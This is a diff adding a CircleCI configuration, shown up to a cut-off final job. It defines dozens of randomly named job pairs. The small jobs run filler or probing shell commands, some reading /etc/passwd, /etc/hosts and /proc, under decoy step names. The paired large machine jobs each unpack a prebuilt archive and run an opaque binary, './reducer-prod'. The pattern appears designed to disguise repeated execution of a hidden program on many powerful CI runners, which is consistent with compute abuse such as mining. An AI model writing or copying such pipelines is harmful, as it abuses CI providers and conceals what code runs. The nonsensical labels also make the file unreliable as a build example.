@@ -1,0 +1,1839 @@
+version: 2.1
+
+jobs:
+  SharedSyncArgUtils:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Else import the boss arena
+          command: |
+            mkdir -p /tmp/input-A
+            set +o pipefail 2>/dev/null; seq 1 1413844 | sort | uniq > /tmp/input-A/f9667fdf-6dcb; true
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'f9667fdf-6dcb'
+  p-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/f9667fdf-6dcb 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  primary-_tan:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Exercise Crimson Fox
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; head -n 3 /etc/skel/.profile | tr '[:lower:]' '[:upper:]'; true ; } > /tmp/input-A/f29be805954af2add1f2
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'f29be805954af2add1f2'
+  blast-off:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/f29be805954af2add1f2 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  rocket_0_14_43:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: welcome the emergency contacts near Toronto
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; command grep -o 'HOME_URL' /etc/os-release|sort|uniq -c; true ; } > /tmp/input-A/surgeloaderazuretitan
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'surgeloaderazuretitan'
+  papa:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/surgeloaderazuretitan 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  start7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: try number one
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; grep -qs 'color' $HOME/.bashrc && echo 'it is there' || echo 'nope'; true ; } > /tmp/input-A/sTocKCoNfiGvAllEY
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'sTocKCoNfiGvAllEY'
+  APP-356:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/sTocKCoNfiGvAllEY 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  dbg_msg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Ship the artifact registry carefully
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; shuf -i 1-903 -n 15 | sort -n | uniq -c | tr -d '[:digit:]'; true ; } > /tmp/input-A/glacier_theta_atom
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'glacier_theta_atom'
+  PROD_DEPLOY_4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/glacier_theta_atom 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  ConcreteSymbolAdapter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Mini map randomized with no errors
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; for word in seoul nairobi denver paris prague vienna; do echo "${word^}"; done | sort; true ; } > /tmp/input-A/20170226
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - '20170226'
+  update-retry:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/20170226 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  deferPendingCountMax:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Tune the door sensor
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; find /var/log -maxdepth 3 -type d ! -name '*.1' -mmin -1440 -exec echo dir: {} \; 2>/dev/null | head --lines=10; true ; } > /tmp/input-A/xbiSLUvM0FiO6d9tM0C
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'xbiSLUvM0FiO6d9tM0C'
+  run-production-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/xbiSLUvM0FiO6d9tM0C 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  text-honey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Mask the bucket policies in safe mode
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; find /var/log -maxdepth 3 -name 'lastlog' -exec echo {} + 2>/dev/null|awk -F/ '{print $NF}'; true ; } > /tmp/input-A/mead0wrus7y
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'mead0wrus7y'
+  whiskey-1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/mead0wrus7y 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  b2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Teleport the mezzanine
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; printf '%s\n' cat tiger frog goose fox | awk '{print length($0), $0}' | sort -rn | head -n 1; true ; } > /tmp/input-A/ModulePayloadKernel
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'ModulePayloadKernel'
+  BUILD_LAB:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/ModulePayloadKernel 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  Copy-TextId:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: serve api
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; find /usr/lib -maxdepth 2 -type f \( -name '*.so*' -o -name 'lib*' \) -exec readlink -f {} \; 2>/dev/null|xargs -r ls -ld|head -n 5; true ; } > /tmp/input-A/blake_fcb8fb8600
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'blake_fcb8fb8600'
+  hyperion-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/blake_fcb8fb8600 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  frank-dst:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Dispatch the mezzanine for next day
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; grep -r case /etc/default 2>/dev/null | nl | head -n8; true ; } > /tmp/input-A/G39Hr4iIy
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'G39Hr4iIy'
+  polaris-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/G39Hr4iIy 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  paintNewModelFile:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Refunding the cost centers one sec
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; builtin echo 'lorem ipsum dolor sit amet'; true ; } > /tmp/input-A/PANO_00078473
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'PANO_00078473'
+  go-live:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/PANO_00078473 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch corpus
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  alice-future:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Back off 200 seconds
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; cat /proc/sys/kernel/hostname|head -n1; true ; } > /tmp/input-A/wallet
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'wallet'
+  orion-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/wallet 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  allow_insert:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Escalation budget 12 ms
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; count_lines(){ [ -f "$1" ] && echo file || echo other; }; count_lines /etc; true ; } > /tmp/input-A/XML_router
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'XML_router'
+  q3-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/XML_router 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prime workspace
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  thx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: cutover depth 3
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 2 -type f -name '*' -exec md5sum {} + 2>/dev/null | wc -l; true ; } > /tmp/input-A/frame931
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'frame931'
+  PackageService:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/frame931 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  lang-eu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Shard the base model with warmup
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; cat /etc/hosts >'/tmp/products.txt' 2>&1 && wc -l '/tmp/products.txt'; true ; } > /tmp/input-A/GLINtEMbEr
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'GLINtEMbEr'
+  callisto-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/GLINtEMbEr 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore snapshot
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  rainish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: reboot
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; ls -d /proc/[0-9]*|awk -F/ '{print $NF}'|paste -s -d ' '; true ; } > /tmp/input-A/RECEIPT_SILENT
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'RECEIPT_SILENT'
+  hotfix-563:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/RECEIPT_SILENT 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch sources
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  cost5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: reloading autoscaler
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; ls /proc | grep -v '^[0-9]' | nl | sort | fmt -w 43; true ; } > /tmp/input-A/thunder-wallet
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'thunder-wallet'
+  mar2-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/thunder-wallet 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  fixture_in_l:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Please do block the mail relay
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; find /usr/share -maxdepth 1 -iname '*.gz' -size 0 -exec echo {} \;; true ; } > /tmp/input-A/build-v4.13.7
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'build-v4.13.7'
+  q4-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/build-v4.13.7 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  take-when:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Checkpoint 25 hero banner conversion
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; shuf -r -n 5 -e heads tails; true ; } > /tmp/input-A/protonPayloadCoinAtom
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'protonPayloadCoinAtom'
+  smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/protonPayloadCoinAtom 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  undoreduce:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Listing to save space
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; base=(sara max lena carol); printf '%s ' "${base[@]}"; echo; true ; } > /tmp/input-A/lepton_flux_carrier
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'lepton_flux_carrier'
+  fix-db:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/lepton_flux_carrier 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  cakstyntklaixo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Export for the handoff
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; date | cut -c1-12 | fold -w 35; true ; } > /tmp/input-A/temp-50019a
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'temp-50019a'
+  rm-dashboard:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/temp-50019a 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  style-symbol-74:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Randomize the dialogue tree and profile
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; a="/meeting/metrics/co.py" && echo "${a#*.}"; true ; } > /tmp/input-A/RUSTY
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'RUSTY'
+  APP-124:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/RUSTY 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  MAX_ALPHA_SIZE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: gotta backfill the geo buckets
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; awk -F: 'NR <= 5{print $1 " uses " $7}' /etc/passwd | nl; true ; } > /tmp/input-A/205.118
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - '205.118'
+  v2-ga4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/205.118 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  haiku-maple:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: The geo buckets are live
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; printf %s 'lorem ipsum dolor sit amet' | sum | awk '{print $1}'; true ; } > /tmp/input-A/bundlesurgemarket
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'bundlesurgemarket'
+  q1-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/bundlesurgemarket 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  AcornV4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: go spawn
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; grep '^/' /etc/shells | sort | uniq -c | fmt -w 32 | tr -s ' '; true ; } > /tmp/input-A/ead1ca791
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'ead1ca791'
+  run-quick-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/ead1ca791 2>/dev/null | head -1; done ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --quiet --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: bunzip2 -c release-static-prod.tar.bz2 | tar xf -
+      - run:
+          command: sh -c "./reducer-prod"
+  UnboundedBoundedEdgeController:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Hold at T minus 5
+          command: |
+            mkdir -p /tmp/input-A
+            { set +o pipefail 2>/dev/null; mkdir -p '/tmp/test_raven'&& touch '/tmp/test_raven'/{uma,erin,heidi}.txt&& ls -l '/tmp/test_raven' | tail -n +2; true ; } > /tmp/input-A/env.tmp.dev
+            echo "stage3"
+      - persist_to_workspace:
+          root: /tmp/input-A
+          paths:
+            - 'env.tmp.dev'
+  ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/input-A
+      - run:
+          name: Load prior fixture
+          command: |
+            { for ch in a e i o u; do grep -c "$ch" /tmp/input-A/env.tmp.dev 2>/dev/null | head -1; done ; } || true
